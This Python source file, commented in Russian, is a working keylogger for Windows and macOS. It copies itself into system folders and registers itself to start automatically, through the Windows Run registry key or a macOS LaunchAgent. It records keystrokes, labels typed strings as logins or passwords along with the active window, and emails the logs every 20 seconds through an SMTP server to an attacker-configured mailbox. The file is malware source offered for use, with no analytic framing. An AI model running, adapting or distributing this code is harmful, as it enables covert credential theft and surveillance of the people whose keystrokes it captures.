import subprocess
import shutil
import sys
from pathlib import Path
import getpass
import winreg as reg

def unpack_to_system32():
    """
        Копирует текущий скрипт в папку System32 на Windows.

        :raises FileNotFoundError: если папка System32 или текущий скрипт не найдены
        :raises PermissionError: если недостаточно прав для записи в папку System32
        """
    try:
        # Определяем путь к папке System32
        system32_path = os.path.join(os.environ["SystemRoot"], "System32")

        # Проверяем, существует ли папка
        if not os.path.exists(system32_path):
            raise FileNotFoundError(f"Папка {system32_path} не найдена.")

        # Определяем путь текущего файла
        current_script = sys.argv[0]

        # Проверяем, существует ли текущий файл
        if not os.path.isfile(current_script):
            raise FileNotFoundError(f"Текущий скрипт не найден: {current_script}")

        # Определяем целевой путь
        destination = os.path.join(system32_path, os.path.basename(current_script))

        # Копируем файл
        shutil.copy2(current_script, destination)

        print(f"Скрипт успешно скопирован в {destination}")

    except PermissionError:
        print("Ошибка: У вас недостаточно прав для записи в папку System32. Запустите скрипт с правами администратора.")
    except Exception as e:
        print(f"Произошла ошибка: {e}")

def setup_autostart_windows(script_path, app_name="MyPythonScript"):
    """
        Добавляет скрипт в автозагрузку Windows через реестр.

        :param script_path: путь к скрипту
        :type script_path: str
        :param app_name: имя приложения для автозапуска
        :type app_name: str
        :raises FileNotFoundError: если файл скрипта не найден
        :raises PermissionError: если доступ к реестру запрещен
        """
    try:
        # Путь к ключу автозапуска в реестре
        reg_key = r"Software\Microsoft\Windows\CurrentVersion\Run"

        # Получаем абсолютный путь к скрипту
        script_absolute_path = os.path.abspath(script_path)

        # Проверяем, существует ли файл скрипта
        if not os.path.exists(script_absolute_path):
            raise FileNotFoundError(f"Скрипт не найден: {script_absolute_path}")

        # Добавляем ключ в реестр
        with reg.OpenKey(reg.HKEY_CURRENT_USER, reg_key, 0, reg.KEY_SET_VALUE) as key:
            reg.SetValueEx(key, app_name, 0, reg.REG_SZ, f'"{sys.executable}" "{script_absolute_path}"')

        print(f"Автозапуск успешно настроен для: {script_absolute_path}")

    except PermissionError:
        print("Ошибка: Не удалось получить доступ к реестру. Запустите скрипт с правами администратора.")
    except Exception as e:
        print(f"Произошла ошибка: {e}")

def unpack_to_macos_directory():
    """
        Копирует текущий скрипт в папку /usr/local/bin на macOS.

        :raises FileNotFoundError: если целевая папка или скрипт не найдены
        :raises PermissionError: если недостаточно прав для записи
        """
    try:
        # Определяем целевую директорию (например, /usr/local/bin)
        target_directory = "/usr/local/bin"

        # Проверяем, существует ли целевая директория
        if not os.path.exists(target_directory):
            raise FileNotFoundError(f"Папка {target_directory} не найдена.")

        # Проверяем, есть ли у нас права на запись
        if not os.access(target_directory, os.W_OK):
            raise PermissionError(f"Недостаточно прав для записи в {target_directory}. Запустите скрипт с sudo.")

        # Определяем путь текущего файла
        current_script = sys.argv[0]

        # Проверяем, существует ли текущий файл
        if not os.path.isfile(current_script):
            raise FileNotFoundError(f"Текущий скрипт не найден: {current_script}")

        # Определяем целевой путь
        destination = os.path.join(target_directory, os.path.basename(current_script))

        # Копируем файл
        shutil.copy2(current_script, destination)

        # Проверяем успешность копирования
        if Path(destination).exists():
            print(f"Скрипт успешно скопирован в {destination}")
        else:
            print(f"Ошибка: Не удалось скопировать скрипт в {destination}")

    except PermissionError as e:
        print(f"Ошибка: {e}")
    except Exception as e:
        print(f"Произошла ошибка: {e}")

def setup_autostart_unix(script_path):
    """
        Настраивает автозапуск скрипта на macOS через LaunchAgents.

        :param script_path: путь к скрипту
        :type script_path: str
        :raises FileNotFoundError: если путь к скрипту не найден
        :raises Exception: если возникла ошибка при создании или загрузке plist-файла
        """
    try:
        # Имя пользователя
        username = getpass.getuser()

        # Путь к LaunchAgents для текущего пользователя
        launch_agents_path = f"/Users/{username}/Library/LaunchAgents"
        if not os.path.exists(launch_agents_path):
            os.makedirs(launch_agents_path)

        # Имя файла plist
        plist_name = "com.example.autostart.plist"
        plist_path = os.path.join(launch_agents_path, plist_name)

        # Путь к вашему скрипту
        script_absolute_path = os.path.abspath(script_path)
        if not os.path.exists(script_absolute_path):
            raise FileNotFoundError(f"Скрипт не найден: {script_absolute_path}")

        # Контент plist-файла
        plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.example.autostart</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/python3</string>
        <string>{script_absolute_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
"""

        # Создание plist-файла
        with open(plist_path, "w") as plist_file:
            plist_file.write(plist_content)

        # Загружаем plist
        os.system(f"launchctl load {plist_path}")

        print(f"Автозапуск успешно настроен. Файл plist: {plist_path}")

    except Exception as e:
        print(f"Ошибка настройки автозапуска: {e}")

def install_and_import(package_name, import_name=None):
    """
    Устанавливает и импортирует Python-пакет. Если пакет уже установлен, импортирует его.

    :param package_name: название пакета для установки
    :type package_name: str
    :param import_name: имя, используемое для импорта (по умолчанию совпадает с package_name)
    :type import_name: str, optional
    :raises subprocess.CalledProcessError: если установка пакета завершилась неудачно
    """
    if not import_name:
        import_name = package_name
    try:
        __import__(import_name)
    except ImportError:
        print(f"[!] Пакет '{package_name}' не установлен. Устанавливаю...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", package_name])
    finally:
        globals()[import_name] = __import__(import_name)


# Список зависимостей
required_packages = {"pynput": "pynput", "pygetwindow": "pygetwindow", }

# Устанавливаем и импортируем зависимости
for package, import_name in required_packages.items():
    install_and_import(package, import_name)

import re
import platform
from pynput import keyboard as pynput_keyboard
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib
import threading
import pygetwindow as gw
import ctypes
import plistlib
import os

# Конфигурация почты
EMAIL_ADDRESS = "СВОЯ_ПОЧТА"
EMAIL_PASSWORD = "ПАРОЛЬ_ОТ_ПОЧТЫ"
SEND_REPORT_EVERY = 20

inputs = []  # Буфер для ввода
collected_data = []  # Сохраненные данные
last_entry_type = None  # Тип последнего ввода (Login/Password)
pressed_keys = set()  # Хранение текущих нажатых клавиш


def get_active_window():
    """
    Получает заголовок активного окна на текущей ОС.

    :return: название активного окна или "Unknown", если не удалось определить
    :rtype: str
    :raises Exception: если произошла ошибка при определении активного окна
    """
    system = platform.system()
    if system == "Windows":
        try:
            return gw.getActiveWindow().title
        except Exception:
            return "Unknown"
    elif system == "Darwin":  # macOS
        try:
            script = 'tell application "System Events" to get name of first process whose frontmost is true'
            return subprocess.check_output(['osascript', '-e', script]).strip().decode('utf-8')
        except Exception as e:
            print(f"[!] Ошибка в get_active_window: {e}")
            return "Unknown"
    else:
        return "Unsupported OS"


def get_current_layout():
    """
    Определяет текущую раскладку клавиатуры.

    :return: код раскладки ("RU", "EN" или "Unknown")
    :rtype: str
    :raises Exception: если произошла ошибка при определении раскладки
    """
    system = platform.system()

    # Для Windows
    if system == "Windows":
        try:
            user32 = ctypes.WinDLL('user32', use_last_error = True)
            hwnd = user32.GetForegroundWindow()
            thread_id = user32.GetWindowThreadProcessId(hwnd, None)
            layout_id = user32.GetKeyboardLayout(thread_id)
            return "RU" if layout_id & 0xFFFF == 0x419 else "EN"
        except Exception as e:
            print(f"[!] Ошибка при определении раскладки для Windows: {e}")
            return "Unknown"

    # Для macOS
    elif system == "Darwin":
        # Метод через plist-файл
        try:
            plist_path = os.path.expanduser("~/Library/Preferences/com.apple.HIToolbox.plist")
            if not os.path.exists(plist_path):
                print("[!] Файл com.apple.HIToolbox.plist отсутствует.")
                return "Unknown"

            with open(plist_path, "rb") as f:
                plist = plistlib.load(f)
                input_sources = plist.get("AppleSelectedInputSources", [])
                if input_sources:
                    layout_name = input_sources[0].get("KeyboardLayout Name", "Unknown")
                    if "Russian" in layout_name:
                        return "RU"
                    elif "US" in layout_name or "ABC" in layout_name:
                        return "EN"
                    else:
                        return layout_name
                else:
                    print("[!] Раскладка не найдена в файле.")
                    # Альтернативный метод через AppleScri
                    try:
                        script = '''
                            tell application "System Events"
                                tell process "SystemUIServer"
                                    get value of attribute "AXTitle" of menu bar item 1 of menu bar 1
                                end tell
                            end tell
                                '''
                        layout = subprocess.check_output(['osascript', '-e', script]).strip().decode('utf-8')
                        if "Russian" in layout:
                            return "RU"
                        elif "US" in layout or "ABC" in layout:
                            return "EN"
                        else:
                            return layout
                    except Exception as e:
                        print(f"[!] Ошибка при определении раскладки для macOS через AppleScript: {e}")
                        return "Unknown"
        except Exception as e:
            print(f"[!] Ошибка при определении раскладки для macOS через plist: {e}")

    else:
        # Если ОС не Windows и не macOS
        return "Unsupported OS"


def convert_to_english(char, shift_pressed=False):
    """
    Конвертирует русский символ в английский, учитывая нажатие Shift.

    :param char: символ для конвертации
    :type char: str
    :param shift_pressed: флаг, указывает, был ли нажат Shift
    :type shift_pressed: bool
    :return: преобразованный символ
    :rtype: str
    """
    en_layout = {'й': 'q', 'ц': 'w', 'у': 'e', 'к': 'r', 'е': 't', 'н': 'y', 'г': 'u', 'ш': 'i', 'щ': 'o', 'з': 'p',
        'х': '[', 'ъ': ']', 'ф': 'a', 'ы': 's', 'в': 'd', 'а': 'f', 'п': 'g', 'р': 'h', 'о': 'j', 'л': 'k', 'д': 'l',
        'ж': ';', 'э': "'", 'я': 'z', 'ч': 'x', 'с': 'c', 'м': 'v', 'и': 'b', 'т': 'n', 'ь': 'm', 'б': ',', 'ю': '.',
        '/': '.', 'ё': '', '1': '1', '2': '2', '3': '3', '4': '4', '5': '5', '6': '6', '7': '7', '8': '8', '9': '9',
        '0': '0', '-': '-', '=': '='}
    en_shift_layout = {'Й': 'q', 'Ц': 'w', 'У': 'e', 'К': 'r', 'Е': 't', 'Н': 'y', 'Г': 'u', 'Ш': 'i', 'Щ': 'o',
        'З': 'p', 'Х': '[', 'Ъ': ']', 'Ф': 'a', 'Ы': 's', 'В': 'd', 'А': 'f', 'П': 'g', 'Р': 'h', 'О': 'j', 'Л': 'k',
        'Д': 'l', 'Ж': ';', 'Э': "'", 'Я': 'z', 'Ч': 'x', 'С': 'c', 'М': 'v', 'И': 'b', 'Т': 'n', 'Ь': 'm', 'Б': ',',
        'Ю': '.', ',': '/', 'Ё': '', '!': '1', '@': '2', '№': '3', ';': '4', '%': '5', ':': '6', '?': '7', '*': '8',
        '(': '9', ')': '0', '_': '-', '+': '='}
    if shift_pressed:
        return en_shift_layout.get(char, char)
    return en_layout.get(char, char)


def convert_to_russian(char, shift_pressed=False):
    """
    Конвертирует английский символ в русский, учитывая нажатие Shift.

    :param char: символ для конвертации
    :type char: str
    :param shift_pressed: флаг, указывает, был ли нажат Shift
    :type shift_pressed: bool
    :return: преобразованный символ
    :rtype: str
    """

    ru_layout = {
        'q': 'й', 'w': 'ц', 'e': 'у', 'r': 'к', 't': 'е', 'y': 'н', 'u': 'г', 'i': 'ш', 'o': 'щ', 'p': 'з',
        '[': 'х', ']': 'ъ', 'a': 'ф', 's': 'ы', 'd': 'в', 'f': 'а', 'g': 'п', 'h': 'р', 'j': 'о', 'k': 'л', 'l': 'д',
        ';': 'ж', "'": 'э', 'z': 'я', 'x': 'ч', 'c': 'с', 'v': 'м', 'b': 'и', 'n': 'т', 'm': 'ь', ',': 'б', '.': 'ю',
        '/': '.', '1': '1', '2': '2', '3': '3', '4': '4', '5': '5', '6': '6', '7': '7', '8': '8', '9': '9', '0': '0',
        '-': '-', '=': '='
    }

    # Раскладка с учетом Shift
    ru_shift_layout = {
        'q': 'Й', 'w': 'Ц', 'e': 'У', 'r': 'К', 't': 'Е', 'y': 'Н', 'u': 'Г', 'i': 'Ш', 'o': 'Щ', 'p': 'З',
        '[': 'Х', ']': 'Ъ', 'a': 'Ф', 's': 'Ы', 'd': 'В', 'f': 'А', 'g': 'П', 'h': 'Р', 'j': 'О', 'k': 'Л', 'l': 'Д',
        ';': 'Ж', "'": 'Э', 'z': 'Я', 'x': 'Ч', 'c': 'С', 'v': 'М', 'b': 'И', 'n': 'Т', 'm': 'Ь', ',': 'Б', '.': 'Ю',
        '/': ',', '1': '!', '2': '"', '3': '№', '4': ';', '5': '%', '6': ':', '7': '?', '8': '*', '9': '(', '0': ')',
        '-': '_', '=': '+'
    }

    if shift_pressed:
        return ru_shift_layout.get(char, char)
    return ru_layout.get(char, char)


def is_phone_number(input_str):
    """
    Проверяет, является ли строка телефонным номером в международном формате E.164.

    :param input_str: входная строка для проверки
    :type input_str: str
    :return: True, если строка является валидным телефонным номером, иначе False
    :rtype: bool
    :raises re.error: если регулярное выражение некорректно
    """
    phone_pattern = r"^\+?[1-9]\d{1,14}$"  # E.164 формат
    if input_str.startswith('+'):
        if len(input_str) < 2:
            return False
    return re.match(phone_pattern, input_str) is not None


def is_email_or_username_or_phone(input_str):
    """
    Определяет, является ли строка email, логином или номером телефона.

    :param input_str: входная строка для проверки
    :type input_str: str
    :return: тип строки: "email", "username", "phone" или None, если строка не соответствует ни одному из форматов
    :rtype: str | None
    :raises re.error: если регулярное выражение некорректно
    """
    email_pattern = r"[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+"
    username_pattern = r"^[a-zA-Z0-9_.-]{3,}$"  # Минимум 3 символа для логина

    if re.match(email_pattern, input_str):
        return "email"
    elif re.match(username_pattern, input_str):
        return "username"
    elif is_phone_number(input_str):
        return "phone"
    else:
        return None


def is_probable_password(input_str):
    """
        Определяет, является ли строка вероятным паролем на основе длины и допустимых символов.

        :param input_str: строка для проверки
        :type input_str: str
        :return: True, если строка соответствует критериям пароля, иначе False
        :rtype: bool
        :raises re.error: если регулярное выражение некорректно
        """
    return (input_str.isalnum() or (len(input_str) >= 8 and re.match(r'^[a-zA-Z0-9@#$%^&+=_-]+$', input_str)))


def process_inputs():
    """
        Обрабатывает введенные данные и классифицирует их как логин, пароль или неизвестные данные.

        :return: None
        :rtype: None

        Обработка:
        - Собирает текст из глобального буфера `inputs`.
        - Если строка определена как email, логин или номер телефона, устанавливает тип "Login".
        - Если предыдущий ввод был "Login", классифицирует текущий ввод как "Password".
        - Если строка соответствует критериям пароля, классифицирует как "Password".
        - В противном случае классифицирует как "Unknown".

        Данные сохраняются в глобальной переменной `collected_data` с меткой времени и активным окном.
        """
    global inputs, last_entry_type
    joined_input = ''.join(inputs).strip()  # Собираем введенный текст

    if not joined_input:
        return

    active_window = get_active_window()

    if is_email_or_username_or_phone(joined_input):
        if last_entry_type == "Login":
            data_type = "Password"
        else:
            data_type = "Login"
    elif is_probable_password(joined_input):
        data_type = "Password"
    else:
        data_type = "Unknown"

    collected_data.append({"timestamp": datetime.now().strftime('%Y-%m-%d %H:%M:%S'), "active_window": active_window,
        "input": joined_input, "type": data_type})

    last_entry_type = data_type
    inputs = []  # Очищаем буфер после обработки


pressed_keys = set()  # Отслеживание текущих нажатых клавиш


def on_press(key):
    """
        Обрабатывает событие нажатия клавиши и добавляет её в глобальный список нажатых клавиш.

        :param key: клавиша, которая была нажата
        :type key: pynput.keyboard.Key или str
        :return: None
        :rtype: None

        Исключения:
        - Обрабатывает любые исключения, возникающие при добавлении клавиши в глобальный список `pressed_keys`.
        - Если возникает ошибка, выводит сообщение об ошибке в консоль.
        """
    global pressed_keys
    try:
        pressed_keys.add(key)
    except Exception as e:
        print(f"[!] Ошибка в on_press: {e}")


def on_release(key):
    """
        Обрабатывает событие отпускания клавиши и выполняет соответствующие действия.

        :param key: клавиша, которая была отпущена
        :type key: pynput.keyboard.Key или str
        :return: False, если клавиша ESC нажата для завершения работы, иначе None
        :rtype: None или bool

        Функционал:
        - Определяет текущую раскладку клавиатуры.
        - Завершает ввод при нажатии Enter.
        - Добавляет пробел в буфер при нажатии Space.
        - Конвертирует символы в зависимости от текущей раскладки (RU или EN).
        - Удаляет последний символ из буфера при нажатии Backspace.
        - Удаляет клавишу из глобального списка `pressed_keys`.
        - Завершает работу программы, если нажата клавиша ESC.

        Исключения:
        - Обрабатывает любые исключения, возникающие во время выполнения логики.
        - Выводит сообщение об ошибке в консоль.
        """
    global inputs, pressed_keys
    try:
        current_layout = get_current_layout()

        # Обработка Enter: завершение ввода
        if key == pynput_keyboard.Key.enter:
            process_inputs()

        elif key == pynput_keyboard.Key.space:  # Пробел
            inputs.append(' ')

        # Обработка обычных символов
        elif hasattr(key, 'char') and key.char:
            char = key.char
            shift_pressed = pynput_keyboard.Key.shift in pressed_keys or pynput_keyboard.Key.shift_r in pressed_keys

            # Конвертация символов в зависимости от раскладки
            if current_layout == "RU":
                char = convert_to_russian(char, shift_pressed)
            if current_layout == "EN":
                char = convert_to_english(char, shift_pressed)
            if char:
                inputs.append(char)

        # Обработка Backspace
        elif key == pynput_keyboard.Key.backspace:
            if inputs:
                inputs.pop()

        # Удаление из списка нажатых клавиш
        if key in pressed_keys:
            pressed_keys.remove(key)

    except Exception as e:
        print(f"[!] Ошибка в обработчике клавиш: {e}")

    # Обработка ESC для завершения работы
    if key == pynput_keyboard.Key.esc:
        print("ESC нажата. Завершаем...")
        return False

class Keylogger:
    """
        Класс Keylogger реализует функционал для записи нажатий клавиш, их обработки и отправки отчетов.

        :param interval: интервал времени между отправкой отчетов (в секундах)
        :type interval: int
        :param report_method: метод отправки отчетов (по умолчанию "email")
        :type report_method: str

        Методы:
        - prepare_mail: подготавливает письмо для отправки с помощью SMTP.
        - sendmail: отправляет подготовленное письмо через указанный SMTP-сервер.
        - report: собирает данные, отправляет отчет и запускает следующий таймер.
        - start: запускает keylogger и обработчик событий клавиатуры.
        """
    def __init__(self, interval, report_method="email"):
        """
            Инициализация Keylogger.

            :param interval: интервал времени между отчетами
            :type interval: int
            :param report_method: метод отправки отчетов (по умолчанию "email")
            :type report_method: str
            """
        self.interval = interval
        self.report_method = report_method

    def prepare_mail(self, message):
        """
            Формирует письмо для отправки с содержанием отчета.

            :param message: текст сообщения
            :type message: str
            :return: подготовленное письмо в виде строки
            :rtype: str
            """
        msg = MIMEMultipart("alternative")
        msg["From"] = EMAIL_ADDRESS
        msg["To"] = EMAIL_ADDRESS
        msg["Subject"] = "Журнал нажатий клавиш"
        text_part = MIMEText(message, "plain")
        msg.attach(text_part)
        return msg.as_string()

    def sendmail(self, email, password, message):
        """
            Отправляет письмо с отчетом через SMTP-сервер.

            :param email: адрес электронной почты отправителя
            :type email: str
            :param password: пароль от учетной записи отправителя
            :type password: str
            :param message: текст сообщения для отправки
            :type message: str
            :raises Exception: если происходит ошибка при отправке письма
            """
        try:
            with smtplib.SMTP(host = "smtp.mail.ru", port = 587) as server:
                server.starttls()
                server.login(email, password)
                server.sendmail(email, email, self.prepare_mail(message))
            print(f"[+] Отправлено письмо на {email}")
        except Exception as e:
            print(f"[!] Ошибка при отправке письма: {e}")

    def report(self):
        """
            Формирует и отправляет отчет о нажатиях клавиш. Затем запускает новый таймер.

            :raises Exception: если происходит ошибка во время формирования или отправки отчета
            """
        try:
            if collected_data:
                message = "\n".join(
                    f"[{entry['timestamp']}] Window: {entry['active_window']} | Type: {entry['type']} | Input: {entry['input']}"
                    for entry in collected_data)
                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, message)
                collected_data.clear()
        except Exception as e:
            print(f"[!] Ошибка в отчете: {e}")
        finally:
            timer = threading.Timer(self.interval, self.report)
            timer.daemon = True
            timer.start()

    def start(self):
        """
            Запускает keylogger и обработчик событий клавиатуры.

            Обрабатывает нажатия и отпускания клавиш, а также отправляет отчеты с указанным интервалом времени.
            """
        listener = pynput_keyboard.Listener(on_press = None, on_release = on_release)
        self.report()
        print(f"{datetime.now()} - Keylogger запущен. Нажмите ESC для выхода")
        listener.start()
        listener.join()

if __name__ == "__main__":
    """
        Точка входа в программу. Выполняет проверку операционной системы, настройку автозапуска и запуск keylogger.

        Функционал:
        - Проверяет текущую операционную систему (Windows или macOS).
        - Выполняет настройку автозапуска и копирование скрипта в системные директории.
        - Если ОС не поддерживается, выводит сообщение в консоль.
        - Инициализирует экземпляр `Keylogger` и запускает его с указанным интервалом отчетности.

        Исключения:
        - Если возникает ошибка при выполнении операций (например, доступ к системным директориям или настройка автозапуска),
          скрипт может завершить выполнение с сообщением об ошибке.
        """
    system = platform.system()
    if system == "Darwin":
        unpack_to_macos_directory()
        setup_autostart_unix("/usr/local/bin/keylloger.py")
    elif system == "Windows":
        unpack_to_system32()
        setup_autostart_windows("C:\Windows\System32\keylloger.py")
    if system not in ["Windows", "Darwin"]:
        print("Скрипт поддерживает только Windows и macOS.")
    else:
        keylogger = Keylogger(interval = SEND_REPORT_EVERY, report_method = "email")
        keylogger.start()